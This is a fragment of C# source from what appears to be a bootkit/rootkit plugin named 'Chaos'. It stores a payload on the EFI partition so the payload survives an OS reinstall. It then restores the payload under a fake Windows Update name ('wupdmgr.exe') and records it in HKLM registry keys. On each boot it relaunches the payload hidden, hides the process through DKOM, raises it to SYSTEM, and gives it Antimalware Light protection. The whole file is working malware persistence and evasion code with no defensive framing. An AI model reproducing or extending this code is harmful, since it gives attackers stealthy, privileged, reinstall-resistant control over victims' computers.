                File.WriteAllText(configPath, json);
                LogVerbose($"Config saved to EFI: {configPath}");
            }
            catch (Exception ex)
            {
                LogVerbose($"BackupToEfiPartition error: {ex.Message}");
            }
        }

        /// <summary>
        /// Check for and restore from EFI backup after OS reinstall
        /// Also launches the restored payload with full protections (hidden, SYSTEM, AM Light)
        /// </summary>
        public static bool RestoreFromEfiBackup()
        {
            string efiMount = null;
            try
            {
                efiMount = MountEfiPartitionSilent();
                if (string.IsNullOrEmpty(efiMount)) return false;

                string backupDir = Path.Combine(efiMount, "EFI", "Chaos");
                string configPath = Path.Combine(backupDir, "config.json");

                if (!File.Exists(configPath))
                {
                    LogVerbose("No EFI backup found");
                    return false;
                }

                LogVerbose("EFI backup found - attempting restore...");

                // Read config and restore payload
                string payloadBackup = Path.Combine(backupDir, "payload.exe");
                if (File.Exists(payloadBackup))
                {
                    // Restore to hidden location (AppData\Local)
                    string localDir = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                    string restoreDir = Path.Combine(localDir, "Microsoft", "WindowsUpdate");
                    Directory.CreateDirectory(restoreDir);
                    string restorePath = Path.Combine(restoreDir, "wupdmgr.exe");
                    File.Copy(payloadBackup, restorePath, true);
                    LogVerbose($"Payload restored to: {restorePath}");

                    // Update registry with new path
                    using (var key = Registry.LocalMachine.CreateSubKey(REGISTRY_KEY))
                    {
                        if (key != null)
                        {
                            key.SetValue("PayloadPath", restorePath);
                            key.SetValue("PayloadName", "wupdmgr.exe");
                            key.SetValue("AutoProtect", 1, RegistryValueKind.DWord);
                            key.SetValue("RestoredDate", DateTime.UtcNow.ToString("o"));
                        }
                    }

                    return true;
                }
            }
            catch (Exception ex)
            {
                LogVerbose($"RestoreFromEfiBackup error: {ex.Message}");
            }
            finally
            {
                if (!string.IsNullOrEmpty(efiMount))
                {
                    UnmountEfiPartition(efiMount);
                }
            }

            return false;
        }

        /// <summary>
        /// Check on each boot if payload exists, restore if needed, apply protections
        /// Should be called during plugin initialization with driver reference
        /// </summary>
        public static void CheckAndRestorePayloadWithProtection(ChaosDriver driver, Action<string> logger = null)
        {
            if (logger != null) SetLogger(logger);
            
            try
            {
                // Read original payload path from registry
                string originalPath = null;
                using (var key = Registry.LocalMachine.OpenSubKey(REGISTRY_KEY))
                {
                    if (key != null)
                    {
                        originalPath = key.GetValue("PayloadPath") as string;
                    }
                }

                if (string.IsNullOrEmpty(originalPath))
                {
                    LogVerbose("[Bootkit] No payload path configured - skipping restore check");
                    return;
                }

                LogVerbose($"[Bootkit] Checking payload at: {originalPath}");

                // Check if original payload exists
                if (File.Exists(originalPath))
                {
                    LogVerbose("[Bootkit] Payload exists - no restore needed");
                    return;
                }

                LogVerbose("[Bootkit] Payload missing! Attempting EFI restore...");

                // Payload doesn't exist - restore from EFI backup
                if (RestoreFromEfiBackup())
                {
                    LogVerbose("[Bootkit] Restored from EFI backup");
                    
                    // Get new path after restore
                    string restoredPath = null;
                    using (var key = Registry.LocalMachine.OpenSubKey(REGISTRY_KEY))
                    {
                        if (key != null)
                        {
                            restoredPath = key.GetValue("PayloadPath") as string;
                        }
                    }

                    if (!string.IsNullOrEmpty(restoredPath) && File.Exists(restoredPath))
                    {
                        LogVerbose($"[Bootkit] Launching restored payload with protections: {restoredPath}");
                        LaunchWithProtections(driver, restoredPath);
                    }
                }
                else
                {
                    LogVerbose("[Bootkit] EFI restore failed - payload not available");
                }
            }
            catch (Exception ex)
            {
                LogVerbose($"[Bootkit] CheckAndRestorePayloadWithProtection error: {ex.Message}");
            }
        }

        /// <summary>
        /// Launch payload with same protections as Invisible Process Execution:
        /// - Hidden window
        /// - SYSTEM token elevation
        /// - Antimalware Light protection
        /// </summary>
        private static void LaunchWithProtections(ChaosDriver driver, string payloadPath)
        {
            try
            {
                // Start process hidden
                var psi = new ProcessStartInfo
                {
                    FileName = payloadPath,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                var proc = Process.Start(psi);
                if (proc == null)
                {
                    LogVerbose("[Bootkit] Failed to start payload process");
                    return;
                }

                int pid = proc.Id;
                LogVerbose($"[Bootkit] Payload started with PID: {pid}");

                if (driver?.IsConnected ?? false)
                {
                    // Hide via DKOM
                    var hideResult = driver.HideProcess(pid);
                    if (hideResult.Success)
                        LogVerbose($"[Bootkit] → Hidden from Task Manager");
                    else
                        LogVerbose($"[Bootkit] → Hide failed: {hideResult.Message}");

                    // Elevate to SYSTEM
                    var elevateResult = driver.ElevateProcess(pid);
                    if (elevateResult.Success)
                        LogVerbose($"[Bootkit] → Elevated to SYSTEM");
                    else
                        LogVerbose($"[Bootkit] → Elevate failed: {elevateResult.Message}");

                    // Add Antimalware Light protection
                    var protectResult = driver.SetProtection(pid, ProtectionType.Light, ProtectionSigner.Antimalware);
                    if (protectResult.Success)
                        LogVerbose($"[Bootkit] → Protected as Antimalware Light");
                    else
                        LogVerbose($"[Bootkit] → Protection failed: {protectResult.Message}");
                }
                else
                {
                    LogVerbose("[Bootkit] Driver not connected - protections not applied");
                }
            }
            catch (Exception ex)
            {
                LogVerbose($"[Bootkit] LaunchWithProtections error: {ex.Message}");
            }
        }
    }

    public class InstallResult
    {
        public bool Success { get; set; }
        public string Message { get; set; }
        public bool RebootRequired { get; set; }
        public bool BackupCreated { get; set; }
        public string EfiPath { get; set; }
    }
}
